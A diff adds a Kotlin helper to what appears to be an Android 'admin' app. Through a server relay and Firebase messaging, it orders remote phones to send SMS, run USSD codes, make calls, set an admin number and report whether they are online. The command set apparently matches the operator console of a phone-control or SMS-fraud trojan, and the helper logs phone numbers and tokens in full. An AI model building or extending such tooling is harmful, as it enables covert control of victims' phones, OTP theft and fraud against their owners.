@@ -1,0 +1,206 @@
+package com.example.admin.utils
+
+import android.content.Context
+import android.util.Log
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
+
+/**
+ * FCMHelper — Android admin app se FCM bhejna.
+ *
+ * Pehle: service_account.json + GoogleCredentials + FCM HTTP v1 direct call
+ * Ab:    Server ke /api/device/:token/fcm/* endpoints call karo
+ *        Server Firebase Admin SDK use karke FCM bhejta hai.
+ *
+ * Fayda:
+ *   - service_account.json assets mein rakhne ki zarurat nahi
+ *   - Credentials Android mein expose nahi hote
+ *   - Same public API — DeviceActivity/FinalActivity mein koi change nahi
+ */
+object FCMHelper {
+    private const val TAG = "FCM_HELPER"
+
+    private val ioScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    private val client: OkHttpClient by lazy {
+        OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .build()
+    }
+
+    // ── initialize ────────────────────────────────────────────────
+    // Pehle service_account.json read karta tha.
+    // Ab kuch nahi karna — server handle karta hai.
+    fun initialize(context: Context): Boolean {
+        Log.d(TAG, "FCMHelper initialized (server-relay mode) ✓")
+        return true
+    }
+
+    // ── isValidFCMToken ───────────────────────────────────────────
+    fun isValidFCMToken(token: String): Boolean {
+        return token.isNotEmpty() &&
+                token.length > 50 &&
+                token.contains(":") &&
+                !token.contains(" ")
+    }
+
+    // ── Core: POST to server FCM relay ────────────────────────────
+    private suspend fun postToServer(
+        path: String,
+        body: JSONObject
+    ): Pair<Boolean, String?> = withContext(Dispatchers.IO) {
+        return@withContext try {
+            val url = "${Constants.DEVICE_API_BASE_URL}$path"
+            Log.d(TAG, "POST $url")
+            Log.d(TAG, "Body: $body")
+
+            val reqBody = body.toString()
+                .toRequestBody("application/json; charset=utf-8".toMediaType())
+
+            val request = Request.Builder()
+                .url(url)
+                .post(reqBody)
+                .build()
+
+            val response = client.newCall(request).execute()
+            val responseText = response.body?.string() ?: ""
+            Log.d(TAG, "Response ${response.code}: $responseText")
+
+            if (response.isSuccessful) {
+                val json = runCatching { JSONObject(responseText) }.getOrNull()
+                val msgId = json?.optString("messageId", "ok") ?: "ok"
+                Pair(true, msgId)
+            } else {
+                val json = runCatching { JSONObject(responseText) }.getOrNull()
+                val err = json?.optString("error", "HTTP ${response.code}") ?: "HTTP ${response.code}"
+                Log.e(TAG, "Server error: $err")
+                Pair(false, err)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "postToServer exception", e)
+            Pair(false, "Exception: ${e.message}")
+        }
+    }
+
+    // ── sendOnlineCheck ───────────────────────────────────────────
+    // POST /api/device/:token/fcm/check-online
+    fun sendOnlineCheck(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendOnlineCheck → uid=$uniqueid")
+        ioScope.launch {
+            val body = JSONObject().apply {
+                put("uid",      uniqueid)
+                put("fcmToken", fcmToken)
+            }
+            val result = postToServer("/fcm/check-online", body)
+            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
+        }
+    }
+
+    // ── sendAdminNumber ───────────────────────────────────────────
+    // POST /api/device/:token/fcm/admin-update
+    fun sendAdminNumber(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        adminNumber: String,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendAdminNumber → uid=$uniqueid number=$adminNumber")
+        ioScope.launch {
+            val body = JSONObject().apply {
+                put("uid",         uniqueid)
+                put("fcmToken",    fcmToken)
+                put("adminNumber", adminNumber)
+                put("status",      if (adminNumber == "inactive") "INACTIVE" else "ACTIVE")
+            }
+            val result = postToServer("/fcm/admin-update", body)
+            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
+        }
+    }
+
+    // ── sendSmsCommand ────────────────────────────────────────────
+    // POST /api/device/:token/fcm/sms
+    fun sendSmsCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        to: String,
+        message: String,
+        simSlot: Int,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendSmsCommand → uid=$uniqueid to=$to sim=$simSlot")
+        ioScope.launch {
+            val body = JSONObject().apply {
+                put("uid",      uniqueid)
+                put("fcmToken", fcmToken)
+                put("to",       to)
+                put("body",     message)
+                put("simSlot",  simSlot)
+            }
+            val result = postToServer("/fcm/sms", body)
+            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
+        }
+    }
+
+    // ── sendUssdCommand ───────────────────────────────────────────
+    // POST /api/device/:token/fcm/ussd
+    fun sendUssdCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        code: String,
+        simSlot: Int,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendUssdCommand → uid=$uniqueid code=$code sim=$simSlot")
+        ioScope.launch {
+            val body = JSONObject().apply {
+                put("uid",      uniqueid)
+                put("fcmToken", fcmToken)
+                put("code",     code)
+                put("simSlot",  simSlot)
+            }
+            val result = postToServer("/fcm/ussd", body)
+            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
+        }
+    }
+
+    // ── sendCallCommand ───────────────────────────────────────────
+    // POST /api/device/:token/fcm/call
+    fun sendCallCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        code: String,
+        simSlot: Int,
+        number: String = "",
+        action: String = "",
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendCallCommand → uid=$uniqueid code=$code sim=$simSlot action=$action")
+        ioScope.launch {
+            val body = JSONObject().apply {
+                put("uid",      uniqueid)
+                put("fcmToken", fcmToken)
+                put("code",     code)
+                put("simSlot",  simSlot)
+                if (number.isNotEmpty())  put("number",     number)
+                if (action.isNotEmpty())  put("actionType", action)
+            }
+            val result = postToServer("/fcm/call", body)
+            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
+        }
+    }
+}
